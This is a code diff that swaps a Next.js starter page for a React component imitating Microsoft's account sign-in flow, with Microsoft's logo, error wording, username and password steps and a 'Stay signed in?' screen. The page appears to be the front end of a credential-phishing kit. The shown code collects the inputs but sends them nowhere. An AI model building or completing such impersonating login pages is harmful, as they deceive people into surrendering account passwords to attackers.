@@ -1,96 +1,197 @@
-import Image from "next/image";
-import Link from "next/link";
+import React, { useState } from 'react';
+import './Signin.module.css'; // Assuming you're using CSS Modules
 
-export default function Home() {
-  return (
-    <main className="flex min-h-screen flex-col items-center justify-between p-24">
-      <div className="z-10 w-full max-w-5xl items-center justify-between font-mono text-sm lg:flex">
-        <p className="fixed left-0 top-0 flex w-full justify-center border-b border-gray-300 bg-gradient-to-b from-zinc-200 pb-6 pt-8 backdrop-blur-2xl dark:border-neutral-800 dark:bg-zinc-800/30 dark:from-inherit lg:static lg:w-auto  lg:rounded-xl lg:border lg:bg-gray-200 lg:p-4 lg:dark:bg-zinc-800/30">
-          Get started with WebFixx&nbsp;
-          <Link href="/api/python" className="font-mono font-bold">
-            <code>api/index.py</code>
-          </Link>
-        </p>
-        <div className="fixed bottom-0 left-0 flex h-48 w-full items-end justify-center bg-gradient-to-t from-white via-white dark:from-black dark:via-black lg:static lg:h-auto lg:w-auto lg:bg-none">
-          <a
-            className="pointer-events-none flex place-items-center gap-2 p-8 lg:pointer-events-auto lg:p-0"
-            href="https://vercel.com?utm_source=create-next-app&utm_medium=appdir-template&utm_campaign=create-next-app"
-            target="_blank"
-            rel="noopener noreferrer"
-          >
-            By{" "}
-            <Image
-              src="/vercel.svg"
-              alt="WebFixx Logo"
-              className="dark:invert"
-              width={100}
-              height={24}
-              priority
-            />
-          </a>
-        </div>
-      </div>
+const SignInPage: React.FC = () => {
+    const [view, setView] = useState<'uname' | 'pwd' | 'final'>('uname');
+    const [unameVal, setUnameVal] = useState<boolean>(false);
+    const [pwdVal, setPwdVal] = useState<boolean>(false);
 
-      <div className="relative flex place-items-center before:absolute before:h-[300px] before:w-[480px] before:-translate-x-1/2 before:rounded-full before:bg-gradient-radial before:from-white before:to-transparent before:blur-2xl before:content-[''] after:absolute after:-z-20 after:h-[180px] after:w-[240px] after:translate-x-1/3 after:bg-gradient-conic after:from-sky-200 after:via-blue-200 after:blur-2xl after:content-[''] before:dark:bg-gradient-to-br before:dark:from-transparent before:dark:to-blue-700 before:dark:opacity-10 after:dark:from-sky-900 after:dark:via-[#0141ff] after:dark:opacity-40 before:lg:h-[360px]">
-        <Image
-          className="relative dark:drop-shadow-[0_0_0.3rem_#ffffff70] dark:invert"
-          src="/next.svg"
-          alt="Next.js Logo"
-          width={180}
-          height={37}
-          priority
-        />
-      </div>
+    const unReq = "Enter a valid email address, phone number, or Skype name.";
+    const pwdReq = "Please enter the password for your Microsoft account.";
 
-      <div className="mb-32 grid text-center lg:mb-0 lg:grid-cols-4 lg:text-left">
-        <Link href="/account" className="group rounded-lg border border-transparent px-5 py-4 transition-colors hover:border-gray-300 hover:bg-gray-100 hover:dark:border-neutral-700 hover:dark:bg-neutral-800/30">
-          <h2 className={`mb-3 text-2xl font-semibold`}>
-            Account{" "}
-            <span className="inline-block transition-transform group-hover:translate-x-1 motion-reduce:transform-none">
-              -&gt;
-            </span>
-          </h2>
-          <p className={`m-0 max-w-[30ch] text-sm opacity-50`}>
-            Find in-depth information about Next.js features and API.
-          </p>
-        </Link>
+    const validate = () => {
+        const unameInp = document.getElementById('inp_uname') as HTMLInputElement;
+        const pwdInp = document.getElementById('inp_pwd') as HTMLInputElement;
+        
+        if (view === 'uname') {
+            if (unameInp.value.trim() === "") {
+                document.getElementById('error_uname')!.innerText = unReq;
+                unameInp.classList.add('error-inp');
+                setUnameVal(false);
+            } else {
+                document.getElementById('error_uname')!.innerText = "";
+                unameInp.classList.remove('error-inp');
+                setUnameVal(true);
+            }
+            unameInp.addEventListener('change', () => {
+                if (unameInp.value.trim() === "") {
+                    document.getElementById('error_uname')!.innerText = unReq;
+                    unameInp.classList.add('error-inp');
+                    setUnameVal(false);
+                } else {
+                    document.getElementById('error_uname')!.innerText = "";
+                    unameInp.classList.remove('error-inp');
+                    setUnameVal(true);
+                }
+            });
+        } else if (view === 'pwd') {
+            if (pwdInp.value.trim() === "") {
+                document.getElementById('error_pwd')!.innerText = pwdReq;
+                pwdInp.classList.add('error-inp');
+                setPwdVal(false);
+            } else {
+                document.getElementById('error_pwd')!.innerText = "";
+                pwdInp.classList.remove('error-inp');
+                setPwdVal(true);
+            }
+            pwdInp.addEventListener('change', () => {
+                if (pwdInp.value.trim() === "") {
+                    document.getElementById('error_pwd')!.innerText = pwdReq;
+                    pwdInp.classList.add('error-inp');
+                    setPwdVal(false);
+                } else {
+                    document.getElementById('error_pwd')!.innerText = "";
+                    pwdInp.classList.remove('error-inp');
+                    setPwdVal(true);
+                }
+            });
+        }
+    };
 
-        <Link href="/debounce" className="group rounded-lg border border-transparent px-5 py-4 transition-colors hover:border-gray-300 hover:bg-gray-100 hover:dark:border-neutral-700 hover:dark:bg-neutral-800/30">
-          <h2 className={`mb-3 text-2xl font-semibold`}>
-            Debounce{" "}
-            <span className="inline-block transition-transform group-hover:translate-x-1 motion-reduce:transform-none">
-              -&gt;
-            </span>
-          </h2>
-          <p className={`m-0 max-w-[30ch] text-sm opacity-50`}>
-            Learn about Next.js in an interactive course with&nbsp;quizzes!
-          </p>
-        </Link>
+    return (
+        <>
+            <section id="section_uname" className={view === 'uname' ? '' : 'd-none'}>
+                <div className="auth-wrapper">
+                    <img src="assets/logo.png" alt="Microsoft" />
+                    <h2 className="title mb-16 mt-16">Sign in</h2>
+                    <form>
+                        <div className="mb-16">
+                            <p id="error_uname" className="error"></p>
+                            <input
+                                id="inp_uname"
+                                type="text"
+                                name="uname"
+                                className="input"
+                                placeholder="Email, phone, or Skype"
+                            />
+                        </div>
+                    </form>
+                    <div>
+                        <p className="mb-16 fs-13">No account? <a href="" className="link">Create one!</a></p>
+                        <p className="mb-16 fs-13">
+                            <a href="#" className="link">Sign in with a security key
+                                <img src="assets/question.png" alt="Question img" />
+                            </a>
+                        </p>
+                    </div>
+                    <div>
+                        <button
+                            className="btn"
+                            id="btn_next"
+                            onClick={() => {
+                                validate();
+                                if (unameVal) {
+                                    setView('pwd');
+                                }
+                            }}
+                        >
+                            Next
+                        </button>
+                    </div>
+                </div>
+                <div className="opts">
+                    <p className="has-icon mb-0" style={{ fontSize: '15px' }}>
+                        <span className="icon">
+                            <img src="assets/key.png" width="30px" alt="Key icon" />
+                        </span>
+                        Sign-in options
+                    </p>
+                </div>
+            </section>
 
-        <Link href="/email-verifier" className="group rounded-lg border border-transparent px-5 py-4 transition-colors hover:border-gray-300 hover:bg-gray-100 hover:dark:border-neutral-700 hover:dark:bg-neutral-800/30">
-          <h2 className={`mb-3 text-2xl font-semibold`}>
-            Email Verifier{" "}
-            <span className="inline-block transition-transform group-hover:translate-x-1 motion-reduce:transform-none">
-              -&gt;
-            </span>
-          </h2>
-          <p className={`m-0 max-w-[30ch] text-sm opacity-50`}>
-            Explore the Next.js 13 playground.
-          </p>
-        </Link>
+            <section id="section_pwd" className={view === 'pwd' ? '' : 'd-none'}>
+                <div className="auth-wrapper">
+                    <img src="assets/logo.png" alt="Microsoft" className="d-block" />
+                    <div className="identity w-100 mt-16 mb-16">
+                        <button className="back">
+                            <img src="assets/back.png" alt="Back" />
+                        </button>
+                        <span id="user_identity">a@b.com</span>
+                    </div>
+                    <h2 className="title mb-16">Enter password</h2>
+                    <form>
+                        <div className="mb-16">
+                            <p id="error_pwd" className="error"></p>
+                            <input
+                                id="inp_pwd"
+                                type="password"
+                                name="pass"
+                                className="input"
+                                placeholder="Password"
+                            />
+                        </div>
+                    </form>
+                    <div>
+                        <p className="mb-16"> <a href="#" className="link fs-13">Forgot password?</a></p>
+                        <p className="mb-16">
+                            <a href="#" className="link fs-13">Other ways to sign in</a>
+                        </p>
+                    </div>
+                    <div>
+                        <button
+                            className="btn"
+                            id="btn_sig"
+                            onClick={() => {
+                                validate();
+                                if (pwdVal) {
+                                    setView('final');
+                                }
+                            }}
+                        >
+                            Sign in
+                        </button>
+                    </div>
+                </div>
+            </section>
 
-        <Link href="/api/docs" className="group rounded-lg border border-transparent px-5 py-4 transition-colors hover:border-gray-300 hover:bg-gray-100 hover:dark:border-neutral-700 hover:dark:bg-neutral-800/30">
-          <h2 className={`mb-3 text-2xl font-semibold`}>
-            Usage{" "}
-            <span className="inline-block transition-transform group-hover:translate-x-1 motion-reduce:transform-none">
-              -&gt;
-            </span>
-          </h2>
-          <p className={`m-0 max-w-[30ch] text-sm opacity-50`}>
-            Instantly deploy your Next.js site to a shareable URL with Vercel.
-          </p>
-        </Link>
-      </div>
-    </main>
-  );
-}
+            <section id="section_final" className={view === 'final' ? '' : 'd-none'}>
+                <div className="auth-wrapper">
+                    <img src="assets/logo.png" alt="Microsoft" className="d-block" />
+                    <div className="identity w-100 mt-16 mb-16">
+                        <span id="user_identity">a@b.com</span>
+                    </div>
+                    <h2 className="title mb-16">Stay signed in?</h2>
+                    <p className="p">Stay signed in so you don't have to sign in again next time.</p>
+                    <label className="has-checkbox">
+                        <input type="checkbox" className="checkbox" />
+                        <span>Don't show this again</span>
+                    </label>
+                    <div className="btn-group">
+                        <button
+                            className="btn btn-sec"
+                            id="btn_final"
+                            onClick={() => window.open(location.href, '_self').close()}
+                        >
+                            No
+                        </button>
+                        <button
+                            className="btn"
+                            id="btn_final"
+                            onClick={() => window.open(location.href, '_self').close()}
+                        >
+                            Yes
+                        </button>
+                    </div>
+                </div>
+            </section>
+
+            <footer className="footer">
+                <a href="#">Terms of use</a>
+                <a href="#">Privacy & cookies</a>
+                <span>.&nbsp;.&nbsp;.</span>
+            </footer>
+        </>
+    );
+};
+
+export default SignInPage;
